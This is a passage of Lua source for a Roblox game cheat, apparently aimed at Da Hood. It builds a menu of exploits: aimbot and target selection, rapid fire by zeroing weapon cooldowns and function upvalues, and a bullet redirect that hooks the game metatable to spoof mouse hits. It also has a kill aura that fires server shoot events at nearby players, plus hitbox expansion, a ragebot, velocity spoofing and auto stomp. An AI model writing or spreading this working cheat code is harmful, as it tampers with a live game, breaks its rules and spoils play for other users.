        DistanceText.Text = math.floor(distance) .. 'm'
    end
end)
end
if isDaHood then
    TargetAimBox:AddToggle("Sentry", {
        Text = "Defense",
        Tooltip = "auto set target who hit you and notify",
        Default = false,
    })
    local replicated: ReplicatedStorage = game:GetService('ReplicatedStorage');
    local players: Players = game:GetService('Players');
    local lplr: Player = players.LocalPlayer;

    local shoot = function(...)

    end

    replicated.MainEvent.OnClientEvent:Connect(function(name, shooter, handle, forced, aimpos, targetpart, _)

        if shooter == lplr then
            return; 
        end;
        if shooter and targetpart and targetpart:IsDescendantOf(lplr.Character) then
            if Toggles.Sentry.Value then
                if Toggles.TargetAimEnabled.Value then
					local targetPlayer = players:FindFirstChild(shooter.Name)
					if targetPlayer then
					    target = targetPlayer
					end
                end
                Library:Notify(shooter.Name .. "hit you - targeted")
            end
        end
    end)
end
TargetBox:AddButton("Teleport", function()
    if not target then return end

    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
    local localHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if targetHRP and localHRP then
        localHRP.CFrame = targetHRP.CFrame
    end
end)
if isDaHood then
    ExploitsBox:AddToggle("RapidFirev1", {
        Text = "Rapid Fire v1",
        Default = false,
        Tooltip = "for xeno, solara, velocity",
        Callback = function(state)
            if state then
                local iter, tbl, index = ipairs(game:GetDescendants())
                while true do
                    local instance
                    index, instance = iter(tbl, index)
                    if index == nil then break end
                    if instance.Name == 'ShootingCooldown' and instance:IsA('ValueBase') then
                        instance.Value = 0
                    end
                end
                game.DescendantAdded:Connect(function(newDescendant)
                    if newDescendant.Name == 'ShootingCooldown' and newDescendant:IsA('ValueBase') then
                        newDescendant.Value = 0
                    end
                end)
                local iter2, tbl2, index2 = ipairs(game:GetDescendants())
                while true do
                    local instance2
                    index2, instance2 = iter2(tbl2, index2)
                    if index2 == nil then break end
                    if instance2.Name == 'ToleranceCooldown' and instance2:IsA('ValueBase') then
                        instance2.Value = 0
                    end
                end
                game.DescendantAdded:Connect(function(newDescendant2)
                    if newDescendant2.Name == 'ToleranceCooldown' and newDescendant2:IsA('ValueBase') then
                        newDescendant2.Value = 0
                    end
                end)
                wait(2)
                Players.LocalPlayer.Character.Humanoid.Health = 0
            end
        end
    })
    ExploitsBox:AddToggle("RapidFirev2", {
        Text = "Rapid Fire v2",
        Default = false,
        Tooltip = "for paid executor",
    })
else
    local isFiring = false
    local utility = {}
    utility.get_gun = function()
        local char = LocalPlayer.Character
        if not char then return nil end
        for _, tool in next, char:GetChildren() do
            if tool:IsA("Tool") and (tool:FindFirstChild("Ammo") or tool:FindFirstChild("AmmoCount") or tool:FindFirstChild("GunScript")) then
                return tool
            end
        end
    end
    utility.rapid = function(tool)
        tool:Activate()
    end
    local rapidFireConnection
    rapidFireConnection = UIS.InputBegan:Connect(function(i, gp)
        if gp then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            local gun = utility.get_gun()
            if Toggles.RapidFire.Value and gun and not isFiring then
                isFiring = true
                task.spawn(function()
                    while isFiring and Toggles.RapidFire.Value do
                        utility.rapid(gun)
                        task.wait(0.1)
                    end
                end)
            end
        end
    end)

    -- Input kết thúc (chuột hoặc cảm ứng)
    local rapidFireEndConnection
    rapidFireEndConnection = UIS.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            isFiring = false
        end
    end)
    ExploitsBox:AddToggle("RapidFire", {
        Text = "Rapid Fire Universal",
        Default = false,
        Tooltip = "for universal game dahood",
    })
end
do
	ExploitsBox:AddToggle('BulletManipulation', {
	    Text = 'Manipulation Bullet',
	    Default = false,
		Tooltip = "doesnt work some game and doesnt work on xeno ,solara",
	    Callback = function(state)
	        getgenv().BulletManipulationEnabled = state
	    end
	})
    local followDepBox = ExploitsBox:AddDependencyBox()
	followDepBox:AddToggle('FollowTargetMode', {
	    Text = 'Follow Target',
	    Default = false,
	    Callback = function(state)
	        getgenv().UsetargetForBullet = state
	    end
	})
    followDepBox:SetupDependencies({
        { Toggles.BulletManipulation, true }
    })
	
	local Players          = game:GetService("Players")
	local RunService       = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	
	local Client = Players.LocalPlayer
	local Mouse  = Client:GetMouse()
	
	local Script = {
	    Functions  = {},
	    Targeting  = {
	        Target = nil,
	    },
	    Connections = {},
	    Utility    = {
	        Gun = {}
	    }
	}
	
	local Config = {
	    Part     = "Head"
	}
	

	function Script.Targeting.GetClosestToMouse()
	    if not getgenv().BulletManipulationEnabled then return end
	
	    local Closest, MinDist = nil, math.huge
	    local MousePos = Vector2.new(Mouse.X, Mouse.Y)
	    local Camera = workspace.CurrentCamera
	
	    for _, Player in ipairs(Players:GetPlayers()) do
	        if Player ~= Client and Player.Character then
	            local Root = Player.Character:FindFirstChild("HumanoidRootPart")
	            local Humanoid = Player.Character:FindFirstChild("Humanoid")
	
	            if Root and Humanoid and Humanoid.Health > 0 then
	                local ScreenPos, OnScreen = Camera:WorldToViewportPoint(Root.Position)
	
	                if OnScreen then
	                    local Dist = (Vector2.new(ScreenPos.X, ScreenPos.Y) - MousePos).Magnitude
	
	                    if Dist < MinDist then
	                        MinDist = Dist
	                        Closest = Player
	                    end
	                end
	            end
	        end
	    end
	
	    return Closest
	end
	
	local function GetActiveBulletTarget()
	    if getgenv().UsetargetForBullet and target then
	        return target
	    end
	    return Script.Targeting.GetClosestToMouse()
	end
	
	Script.Functions.CFrameToOffset = function(Origin, Target)
	    local ActualOrigin = Origin * CFrame.new(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0)
	    return ActualOrigin:ToObjectSpace(Target):inverse()
	end
	
	Script.Functions.TeleportBullet = function(Tool)
	    if not getgenv().BulletManipulationEnabled then return end
	
	    local TargetPlayer = GetActiveBulletTarget()
	    if not (TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("HumanoidRootPart")) then
	        return
	    end
	
	    local OriginPart = Client.Character and Client.Character:FindFirstChild("HumanoidRootPart")
	    local TargetPart = TargetPlayer.Character.HumanoidRootPart
	
	    if OriginPart and TargetPart then
	        local OriginalGrip = Tool.Grip
	
	        Tool.Parent = Client.Backpack
	        Tool.Grip   = Script.Functions.CFrameToOffset(Client.Character.RightHand.CFrame, TargetPart.CFrame)
	        Tool.Parent = Client.Character
	
	        RunService.RenderStepped:Wait()
	
	        Tool.Parent = Client.Backpack
	        Tool.Grip   = OriginalGrip
	        Tool.Parent = Client.Character
	    end
	end

	function Script.Functions.HandleCharacter(Character)
	    -- Clean up old connections
	    for _, key in ipairs({"CharacterChildAdded", "ChildRemovingCharacter"}) do
	        if Script.Connections[key] then
	            Script.Connections[key]:Disconnect()
	        end
	    end
	
	    Script.Connections.CharacterChildAdded = Character.ChildAdded:Connect(function(Tool)
	        if Tool:IsA("Tool") then
	            -- Disable grip change connections to prevent conflict
	            for _, conn in ipairs(getconnections(Tool:GetPropertyChangedSignal("Grip"))) do
	                conn:Disable()
	            end
	
	            Script.Connections.ToolActivated = Tool.Activated:Connect(function()
	                if getgenv().BulletManipulationEnabled then
	                    Script.Functions.TeleportBullet(Tool)
	                end
	            end)
	        end
	    end)
	
	    Script.Connections.ChildRemovingCharacter = Character.ChildRemoved:Connect(function(child)
	        if child:IsA("Tool") then
	            Script.Utility.Gun.Tool = nil
	            if Script.Connections.ToolActivated then
	                Script.Connections.ToolActivated:Disconnect()
	            end
	        end
	    end)
	end
	
	-- Setup current & future characters
	local CurrentCharacter = Client.Character or Client.CharacterAdded:Wait()
	Script.Functions.HandleCharacter(CurrentCharacter)
	
	Client.CharacterAdded:Connect(Script.Functions.HandleCharacter)
	
	Client.CharacterRemoving:Connect(function()
	    for _, key in ipairs({"CharacterChildAdded", "ChildRemovingCharacter"}) do
	        if Script.Connections[key] then
	            Script.Connections[key]:Disconnect()
	        end
	    end
	end)
    pcall(function()
	local Mt = getrawmetatable(game)
	setreadonly(Mt, false)
	
	local OldIndex = Mt.__index
	
	Mt.__index = function(Self, Index)
	    if not checkcaller() and Self == Mouse and getgenv().BulletManipulationEnabled then
	        if (Index == "Hit" or (Index == "Target" and game.PlaceId == 2788229376)) then
	            local TargetPlayer = GetActiveBulletTarget()
	            if TargetPlayer and TargetPlayer.Character then
	                local Part = TargetPlayer.Character:FindFirstChild(Config.Part)
	                if Part then
	                    return CFrame.new(Part.Position)
	                end
	            end
	        end
	    end
	    return OldIndex(Self, Index)
	end
	
	setreadonly(Mt, true)
	end)
end
ExploitsBox:AddToggle("AutoReload", {
    Text = "Auto Reload",
    Default = false,
    Tooltip = "Support some dahood fake",
})
getgenv().range = 250
getgenv().whitelist = {}
getgenv().tracer = Instance.new("Part")
getgenv().tracer.Size = Vector3.new(0.2, 0.2, 0.2)
getgenv().tracer.Material = Enum.Material.Neon
getgenv().tracer.Color = Color3.new(1, 0, 0)
getgenv().tracer.Transparency = 1
getgenv().tracer.Anchored = true
getgenv().tracer.CanCollide = false
getgenv().tracer.Parent = workspace

getgenv().enabled = false
getgenv().visualizeEnabled = false
getgenv().silentEnabled = false
getgenv().lastHealth = {}

function playHitsound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://4817809188" -- gamesense hit sound
    sound.Volume = 0.8
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    sound.Ended:Connect(function() sound:Destroy() end)
end
if KillAuraBox then 
	KillAuraBox:AddToggle('MainToggle', {
		Text = 'Kill Aura',
		Default = false,
		Callback = function(state)
			getgenv().enabled = state
			if not state then
				getgenv().tracer.Transparency = 1
			end
		end
	}):AddKeyPicker('Keybind', {
		Default = 'K',
		Text = 'kill aura',
		Mode = 'Toggle',
		SyncToggleState = true,
	})

	KillAuraBox:AddSlider("Range", {
		Text = "Range",
		Default = 250,
		Min = 10,
		Max = 1000,
		Rounding = 1,
		Callback = function(value)
			getgenv().range = value
		end
	})

	KillAuraBox:AddToggle('Visualizer', {
		Text = 'Visualize',
		Default = false,
		Callback = function(state)
			getgenv().visualizeEnabled = state
		end
	}):AddColorPicker('VisualizerColor', {
		Text = 'Visualizer Color',
		Default = Color3.new(1, 0, 0),
		Callback = function(value)
			getgenv().tracer.Color = value
		end
	})

	KillAuraBox:AddToggle('Silent', {
		Text = 'Silent',
		Default = false,
		Callback = function(state)
			getgenv().silentEnabled = state
		end
	})

	KillAuraBox:AddInput('wlb', {
		Default = '',
		Numeric = false,
		Finished = false,
		Text = 'Add/Remove Player (Whitelist)',
		Tooltip = 'name/displayname',
		Placeholder = 'Player Name',
		Callback = function(input)
			for _, player in pairs(Players:GetPlayers()) do
				if player.Name == input or player.DisplayName == input then
					if getgenv().whitelist[player.Name] then
						getgenv().whitelist[player.Name] = nil
						Library:Notify(player.Name .. " removed from whitelist.", 2)
					else
						getgenv().whitelist[player.Name] = true
						Library:Notify(player.Name .. " added to whitelist.", 2)
					end
					return
				end
			end
			Library:Notify("Player not found.", 2)
		end,
		Autocomplete = function(input)
			local suggestions = {}
			for _, player in pairs(Players:GetPlayers()) do
				if string.find(string.lower(player.Name), string.lower(input)) or string.find(string.lower(player.DisplayName), string.lower(input)) then
					table.insert(suggestions, player.Name .. " (" .. player.DisplayName .. ")")
				end
			end
			return suggestions
		end
	})
	task.spawn(function()
		while true do
			if getgenv().enabled 
				and Players.LocalPlayer.Character 
				and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") 
				and Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") 
				and Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Handle") then

				if workspace:FindFirstChild("Players") 
					and workspace.Players:FindFirstChild(Players.LocalPlayer.Name) 
					and workspace.Players:FindFirstChild(Players.LocalPlayer.Name):FindFirstChild("BodyEffects") 
					and workspace.Players:FindFirstChild(Players.LocalPlayer.Name).BodyEffects:FindFirstChild("K.O") 
					and workspace.Players:FindFirstChild(Players.LocalPlayer.Name).BodyEffects["K.O"].Value then
					task.wait()
				else
					local closest = math.huge
					local target = nil

					for _, player in pairs(Players:GetPlayers()) do
						if player ~= Players.LocalPlayer 
							and not getgenv().whitelist[player.Name] 
							and player.Character 
							and player.Character:FindFirstChild("Head") 
							and not player.Character:FindFirstChild("GRABBING_CONSTRAINT") then

							if workspace:FindFirstChild("Players") 
								and workspace.Players:FindFirstChild(player.Name) 
								and workspace.Players:FindFirstChild(player.Name):FindFirstChild("BodyEffects") 
								and workspace.Players:FindFirstChild(player.Name).BodyEffects:FindFirstChild("K.O") 
								and not workspace.Players:FindFirstChild(player.Name).BodyEffects["K.O"].Value then

								local dist = (Players.LocalPlayer.Character.HumanoidRootPart.Position - player.Character.Head.Position).Magnitude
								if dist < closest and dist <= getgenv().range then
									closest = dist
									target = player
								end
							end
						end
					end

					if target and target.Character and target.Character:FindFirstChild("Head") then
						-- Visualize
						if getgenv().visualizeEnabled then
							getgenv().tracer.Transparency = 0
							getgenv().tracer.Size = Vector3.new(0.2, 0.2, (Players.LocalPlayer.Character.HumanoidRootPart.Position - target.Character.Head.Position).Magnitude)
							getgenv().tracer.CFrame = CFrame.lookAt(Players.LocalPlayer.Character.HumanoidRootPart.Position, target.Character.Head.Position) * CFrame.new(0, 0, -getgenv().tracer.Size.Z / 2)
						else
							getgenv().tracer.Transparency = 1
						end

						-- Hit sound
						local humanoid = target.Character:FindFirstChild("Humanoid")
						if humanoid then
							if not getgenv().lastHealth[target.Name] then getgenv().lastHealth[target.Name] = humanoid.Health end
							if humanoid.Health < getgenv().lastHealth[target.Name] then
								playHitsound()
							end
							getgenv().lastHealth[target.Name] = humanoid.Health
						end

						-- Shoot
						if getgenv().silentEnabled then
							game.ReplicatedStorage.MainEvent:FireServer(
								"ShootGun",
								Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Handle"),
								Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Handle").CFrame.Position - Vector3.new(0, 12, 0),
								target.Character.Head.Position - Vector3.new(0, 12, 0),
								target.Character.Head,
								Vector3.new(0, 0, -1)
							)
						else
							game.ReplicatedStorage.MainEvent:FireServer(
								"ShootGun",
								Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Handle"),
								Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Handle").CFrame.Position,
								target.Character.Head.Position,
								target.Character.Head,
								Vector3.new(0, 0, -1)
							)
						end
					else
						getgenv().tracer.Transparency = 1
					end
				end
			else
				getgenv().tracer.Transparency = 1
			end
			task.wait()
		end
	end)
end
local RunService = game:GetService("RunService")

RunService.Heartbeat:Connect(function()
    if not Toggles.AutoReload.Value then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return end
    
    local ammo = tool:FindFirstChild("Ammo")
    if not ammo then return end
    
    if ammo.Value <= 0 then
        MainEvent:FireServer("Reload", tool)
    end
end)
local Original = {}
local Visuals = {}
hitboxsize = 10
hitboxcolor = Color3.fromRGB(255, 255, 255)
ExploitsBox:AddToggle('HitboxExpander', {
    Text = 'Hitbox',
    Default = false,
}):AddColorPicker('HitboxColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(Value)
        hitboxcolor = Value
    end
})
function applyToHRP(HRP)
    if not Original[HRP] then
        Original[HRP] = {
            Size = HRP.Size,
            CanCollide = HRP.CanCollide
        }
    end

    HRP.Size = Vector3.new(hitboxsize, hitboxsize, hitboxsize)
    HRP.CanCollide = false

    if not Visuals[HRP] then
        local sphere = Instance.new("Part")
        sphere.Name = "HitboxVisualizer"
        sphere.Material = Enum.Material.ForceField
        sphere.Color = hitboxcolor
        sphere.Size = Vector3.new(hitboxsize, hitboxsize, hitboxsize)
        sphere.Anchored = false
        sphere.CanCollide = false
        sphere.Massless = true
        sphere.Parent = workspace

        Visuals[HRP] = sphere
    end
end

function revertHRP(HRP)
    local data = Original[HRP]
    if data then
        HRP.Size = data.Size
        HRP.CanCollide = data.CanCollide
    end

    if Visuals[HRP] then
        Visuals[HRP]:Destroy()
        Visuals[HRP] = nil
    end
end

RunService.RenderStepped:Connect(function()
    for _, Player in ipairs(Players:GetPlayers()) do
        if Player ~= LocalPlayer then
            local char = Player.Character
            local HRP = char and char:FindFirstChild("HumanoidRootPart")
            if HRP then
                if Toggles.HitboxExpander.Value then
                    applyToHRP(HRP)
                    local visual = Visuals[HRP]
                    if visual then
                        visual.CFrame = HRP.CFrame
                    end
                else
                    revertHRP(HRP)
                end
            end
        end
    end
end)

local depboxhitbox = ExploitsBox:AddDependencyBox()
depboxhitbox:AddSlider('HitboxSize', {
    Text = 'Size',
    Min = 2,
    Max = 30,
    Default = 10,
    Rounding = 1,
    Callback = function(Value)
        hitboxsize = Value
        for HRP, sphere in pairs(Visuals) do
            sphere.Size = Vector3.new(hitboxsize, hitboxsize, hitboxsize)
            HRP.Size = Vector3.new(hitboxsize, hitboxsize, hitboxsize)
        end
    end
})
depboxhitbox:SetupDependencies({
	{ Toggles.HitboxExpander, true } 
})
LocalPlayer.CharacterAdded:Connect(onCharacter)
local connection = RunService.Heartbeat:Connect(function()
    if isDaHood and supportHook then 
        if Toggles.RapidFirev2.Value then
            local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass('Tool')
            if tool and tool:FindFirstChild('GunScript') then
                for _, v in ipairs(getconnections(tool.Activated))do
                    local funcinfo = debug.getinfo(v.Function)
                    for i = 1, funcinfo.nups do
                        local c, n = debug.getupvalue(v.Function, i)
                        if type(c) == 'number' then
                            debug.setupvalue(v.Function, i, 0)
                        end
                    end
                end
            end
        end
    end
    local camera = workspace.CurrentCamera
    if not camera then return end
    if Toggles.AutoSelect.Value then
        target = getNearestTarget()
    end
    if Toggles.HighlightTarget.Value and target and target.Character then
        local char = target.Character
        if not currentHL or currentHL.Parent ~= char then
            if currentHL then currentHL:Destroy() end
            currentHL = Instance.new("Highlight", char)
        end
        currentHL.FillColor = outlinehighlight
        currentHL.OutlineColor = outlinehighlight
        currentHL.FillTransparency = 1
        currentHL.OutlineTransparency = Options.OutlineTransparency.Value
        local hum = char:FindFirstChild("Humanoid")
        if hum then
            if target ~= oldTarget then
                oldHealth = hum.Health
                oldTarget = target
            end
            if hum.Health < oldHealth then
                currentHL.OutlineColor = Color3.new(1, 0, 0)
                TweenService:Create(currentHL, TweenInfo.new(1), {OutlineColor = Options.OutlineColor.Value}):Play()
                oldHealth = hum.Health
            else
                oldHealth = hum.Health
            end
        end
    else
        if currentHL then
            currentHL:Destroy()
            currentHL = nil
        end
        oldHealth = nil
        oldTarget = nil
    end
    if Toggles.UseFOV.Value and Toggles.ShowFOV.Value then
        local viewport = camera.ViewportSize
        local targetPos

        if isMobile then
            targetPos = Vector2.new(viewport.X / 2, viewport.Y / 2)
        else
            targetPos = UIS:GetMouseLocation()
        end

        fovCircle.Position = targetPos
        fovCircle.Radius = Options.FOVSize.Value
        fovCircle.Color = Options.FOVColor.Value
        fovCircle.Visible = true
    else
        fovCircle.Visible = false
    end
    if Toggles.Tracer.Value and target and target.Character then
        local myChar = Players.LocalPlayer.Character
        if myChar then
            local fromPos2D
            if Options.TracerFrom.Value == "Mouse" then
                fromPos2D = UIS:GetMouseLocation()
            else
                local fromPartName = Options.TracerFrom.Value
                if fromPartName == "Tool" then
                    local tool = myChar:FindFirstChildOfClass("Tool")
                    fromPartName = tool and tool:FindFirstChild("Handle") or myChar:FindFirstChild("UpperTorso")
                else
                    fromPartName = myChar:FindFirstChild(fromPartName)
                end
                if fromPartName then
                    local fromPos3D, onScreen = camera:WorldToViewportPoint(fromPartName.Position)
                    if onScreen then
                        fromPos2D = Vector2.new(fromPos3D.X, fromPos3D.Y)
                    end
                end
            end
            if fromPos2D then
                local hitPart = getHitPart(target)
                if hitPart then
                    local toPos3D, onScreen = camera:WorldToViewportPoint(hitPart.Position)
                    if onScreen then
                        local toPos2D = Vector2.new(toPos3D.X, toPos3D.Y)
                        tracer.From = fromPos2D
                        tracer.To = toPos2D
                        tracer.Color = Options.TracerColor.Value
                        tracer.Visible = true
                    else
                        tracer.Visible = false
                    end
                else
                    tracer.Visible = false
                end
            else
                tracer.Visible = false
            end
        else
            tracer.Visible = false
        end
    else
        tracer.Visible = false
    end
    if Options.Mode.Value["Camera"] and target and target.Character then
        local hitPart = getHitPart(target)
        if hitPart and not KnockCheck(target) then
            local aimAt = hitPart.CFrame + hitPart.AssemblyLinearVelocity * (autoPredictionEnabled and (ping / 2000) or predictionValue)
            camera.CFrame = camera.CFrame:Lerp(CFrame.lookAt(camera.CFrame.Position, aimAt.Position), Options.Smoothness.Value)
        end
    end
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "statusragebot"
screenGui.ResetOnSpawn = false
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(0, 200, 0, 30)
textLabel.Position = UDim2.new(0.5, -100, 0.5, -10)
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 16
textLabel.FontFace = Font.new("rbxasset://proggyclean-Regular.ttf", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
textLabel.Text = ""
textLabel.TextTransparency = 0
textLabel.Parent = screenGui

local stroke = Instance.new("UIStroke")
stroke.Parent = textLabel
stroke.Color = Color3.fromRGB(0, 0, 0)
stroke.Thickness = 1
stroke.Transparency = 0

local currentTween = nil

function showMessage(message, duration)
    if currentTween then
        currentTween:Cancel()
        currentTween = nil
    end
    textLabel.Text = message
    textLabel.TextTransparency = 0
    
    task.delay(duration, function()
        currentTween = game:GetService("TweenService"):Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
        currentTween:Play()
        currentTween.Completed:Connect(function()
            textLabel.Text = ""
            currentTween = nil
        end)
    end)
end

local RageBox = Tabs.Ragebot:AddLeftGroupbox("Rage")
local PlayerListBox = Tabs.Ragebot:AddLeftGroupbox("Player List")
local VelocitySpooferBox = Tabs.Ragebot:AddRightGroupbox("Velocity Spoofer")
local VisualizeBox = Tabs.Ragebot:AddRightGroupbox("Visualize")
local ExploitsBox = Tabs.Ragebot:AddRightGroupbox("Exploits")
if isDaHood then
    local Tipbox = Tabs.Ragebot:AddRightGroupbox("Tip for noob")
    Tipbox:AddLabel('remember enable forcehit\nif want auto shoot\nturn on in main tab')
    if sethiddenproperty then
		local flametoggle = ExploitsBox:AddToggle("FlameHack", {
		    Text = "Flame Hack",
		    Default = false,
		})
    else
        ExploitsBox:AddLabel("ur executor not support flame")
    end
end
ExploitsBox:AddToggle("AutoArmor", {
    Text = "Auto Armor",
    Default = false,
})
ExploitsBox:AddToggle('AutoBagEnabled', {
    Text = 'Enable AutoBag',
    Default = false,
}):AddKeyPicker('AutoBagKey', { Default = 'N', Mode = 'Toggle', SyncToggleState = true })

ExploitsBox:AddSlider('AutoBagHeight', {
    Text = 'AutoBag Height',
    Default = 3,
    Min = 0, Max = 20, Rounding = 0,
})

RageBox:AddToggle("RagebotEnabled", {
    Text = "Ragebot",
    Default = false,
}):AddKeyPicker("RagebotKey", {
    Default = "H",
    Mode = "Toggle",
    Callback = function(state)
        Toggles.RagebotEnabled.Value = state
    end,
}):AddColorPicker("StatusTextColor", {
    Default = Color3.fromRGB(255, 255, 255),
    Title = "Status Text Color",
    Callback = function(value)
        textLabel.TextColor3 = value
    end
})
RageBox:AddDropdown("AutoBuy", {
    Values = { '[Rifle]', '[Flintlock]', '[LMG]', '[Deagle]', '[AK47]', '[AUG]', '[AR]', '[Double-Barrel SG]', '[Drum-Shotgun]', '[DrumGun]', '[Glock]', '[P90]', '[Revolver]', '[Shotgun]', '[Silencer]', '[SilencerAR]', '[TacticalShotgun]' },
    Default = {'[Rifle]'},
    Multi = true,
    Searchable = true,
    Text = "AutoBuy/ auto equip",
})

RageBox:AddToggle("BypassVoid", {
    Text = "Bypass TP Void",
    Default = false,
})
RageBox:AddToggle("IdleSpam", {
    Text = "Idle Spam",
    Default = false,
})

local depboxIdle = RageBox:AddDependencyBox()
depboxIdle:AddSlider("ActiveTime", {
    Text = "Active Time",
    Default = 0.8,
    Min = 0.1,
    Max = 3,
    Rounding = 1,
})
depboxIdle:AddSlider("InactiveTime", {
    Text = "Inactive Time",
    Default = 1,
    Min = 0.1,
    Max = 3,
    Rounding = 1,
})
depboxIdle:SetupDependencies({
    { Toggles.IdleSpam, true }
})

RageBox:AddToggle("AutoStomp", {
    Text = "Auto Stomp",
    Default = false,
})

RageBox:AddToggle("Spoof", {
    Text = "Spoof",
    Default = true,
})

RageBox:AddToggle("Resolver", {
    Text = "Resolver",
    Default = false,
})

RageBox:AddToggle("Spectate", {
    Text = "Spectate",
    Default = false,
    Callback = function(state)
        Toggles.Spectate.Value = state
        if state and target then
            workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
        else
            workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
        end
    end,
}):AddKeyPicker("SpectateKey", {
    Default = "B",
    Mode = "Toggle",
    Callback = function(state)
        Toggles.Spectate.Value = state
        if state and target then
            workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
        else
            workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
        end
    end,
})

VelocitySpooferBox:AddToggle("VelocitySpoofer", {
    Text = "Velocity Spoofer",
    Default = false,
})

local depboxVelocity = VelocitySpooferBox:AddDependencyBox()
depboxVelocity:AddToggle("DisableWhenTargetKO", {
    Text = "Disable When Target KO",
    Default = false,
})
depboxVelocity:AddSlider("VelocityX", {
    Text = "X",
    Default = 0,
    Min = -100000,
    Max = 100000,
    Rounding = 0,
})
depboxVelocity:AddSlider("VelocityY", {
    Text = "Y",
    Default = 0,
    Min = -100000,
    Max = 100000,
    Rounding = 0,
})
depboxVelocity:AddSlider("VelocityZ", {
    Text = "Z",
    Default = 0,
    Min = -100000,
    Max = 100000,
    Rounding = 0,
})
depboxVelocity:SetupDependencies({
    { Toggles.VelocitySpoofer, true }
})

VisualizeBox:AddToggle("VisualImage", {
    Text = "Image",
    Default = true,
}):AddColorPicker("VisualImageColor", {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(c)
        if imageLabel then
            imageLabel.ImageColor3 = c
        end
    end
}):AddColorPicker("VisualBackgroundColor", {
    Default = Color3.fromRGB(0, 0, 0),
    Callback = function(c)
        if frame then
            frame.BackgroundColor3 = c
        end
    end
}):AddColorPicker("VisualStrokeColor", {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(c)
        if uiStroke then
            uiStroke.Color = c
        end
    end
})

local ShopTable = {
    ["[Rifle]"]          = { ShopName = "[Rifle] - $1745" },
    ["[Rifle Ammo]"]     = { ShopName = "5 [Rifle Ammo] - $281" },
    ["[AUG]"]            = { ShopName = "[AUG] - $2195" },
    ["[AUG Ammo]"]       = { ShopName = "90 [AUG Ammo] - $90" },
    ["[Flintlock]"]      = { ShopName = "[Flintlock] - $1463" },
    ["[Flintlock Ammo]"] = { ShopName = "6 [Flintlock Ammo] - $168" },
    ["[LMG]"]            = { ShopName = "[LMG] - $4221" },
    ["[LMG Ammo]"]       = { ShopName = "200 [LMG Ammo] - $338" },
    ["[Revolver]"]          = { ShopName = "[Revolver] - $1463" },
    ["[Revolver Ammo]"]     = { ShopName = "12 [Revolver Ammo] - $84" },
    ["[Flamethrower]"]      = { ShopName = "[Flamethrower] - $10130" },
    ["[Flamethrower Ammo]"] = { ShopName = "140 [Flamethrower Ammo] - $1126" },
    ["[Shotgun]"]      = { ShopName = "[Shotgun] - $1407" },
    ["[Shotgun Ammo]"] = { ShopName = "20 [Shotgun Ammo] - $68" },
    ["[AK47]"]      = { ShopName = "[AK47] - $2532" },
    ["[AK47 Ammo]"] = { ShopName = "90 [AK47 Ammo] - $90" },
    ["[TacticalShotgun]"]      = { ShopName = "[TacticalShotgun] - $1970" },
    ["[TacticalShotgun Ammo]"] = { ShopName = "20 [TacticalShotgun Ammo] - $68" },
    ["[SilencerAR]"]      = { ShopName = "[SilencerAR] - $1407" },
    ["[SilencerAR Ammo]"] = { ShopName = "120 [SilencerAR Ammo] - $84" },
    ["[Deagle]"] = { ShopName = "[Deagle] - $11255" },
    ["[Deagle Ammo]"] = { ShopName = "6 [Deagle Ammo] - $1462" },
}

function getAmmoCount1(gunName)
    local LocalPlayer = Players.LocalPlayer
    local inventory = LocalPlayer.DataFolder.Inventory
    local ammo = inventory:FindFirstChild(gunName)
    if ammo then
        return tonumber(ammo.Value) or 0
    end
    return 0
end


local previousPosition = nil
local previousTime = nil

function NewVelocity(object)
    local currentPosition = object.Position
    local currentTime = tick()
    if previousPosition and previousTime then
        local deltaTime = currentTime - previousTime
        local velocity = (currentPosition - previousPosition) / deltaTime
        object.AssemblyLinearVelocity = velocity
    end
    previousPosition = currentPosition
    previousTime = currentTime
end

local inVoid = false
local phaseTimer = 0
local phaseDuration = 1.0
local activetime = 0.8
local inactivetime = 1

Options.ActiveTime:OnChanged(function(value) activetime = value end)
Options.InactiveTime:OnChanged(function(value) inactivetime = value end)

local imageScreenGui = nil
local frame = nil
local uiStroke = nil
local imageLabel = nil
local imageTween = nil

function createImage()
    if imageScreenGui then
        pcall(function()
            imageScreenGui:Destroy()
        end)
    end
    imageScreenGui = Instance.new('ScreenGui')
    imageScreenGui.Name, imageScreenGui.ResetOnSpawn, imageScreenGui.ZIndexBehavior = 'DesyncImageGui', false, Enum.ZIndexBehavior.Sibling
    imageScreenGui.Parent = LocalPlayer:WaitForChild('PlayerGui')
    frame = Instance.new('Frame')
